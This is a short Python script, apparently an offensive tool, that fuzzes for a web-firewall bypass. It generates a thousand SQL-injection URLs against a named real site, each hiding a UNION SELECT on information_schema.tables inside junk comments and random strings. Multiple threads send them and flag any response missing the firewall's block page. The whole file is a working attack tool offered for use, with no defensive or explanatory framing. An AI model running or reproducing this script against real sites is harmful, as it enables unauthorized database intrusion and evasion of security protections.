# -*- coding:utf-8 -*-
# hope team

import random
import requests
import Queue
import threading

Q=Queue.Queue()

def string(x,y):
    seed = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@$%^&*()_+=-"
    for i in range(x):
        sa=''.join([random.choice(seed) for x in range(y)])
        Q.put('http://www.safedog.cn/service.html?serIdx=2/********ssssssss**********/union/********ssssssss**********/select/********ssssssss**********/1,2/********ssssssss**********/from/********ssssssss**********//*%s*/information_schema.tables*/%s*/'% (sa,sa))

def fuzz():
    while not Q.empty():
        try:
            url=Q.get()
            print url
            r=requests.get(url=url).text
            if u'网站防火墙' not in r:
                print u'[*] %s' % (url)
        except:
            pass

if __name__ == '__main__':
    string(1000,20)
    for i in range(20):
        t=threading.Thread(target=fuzz)
        t.start()
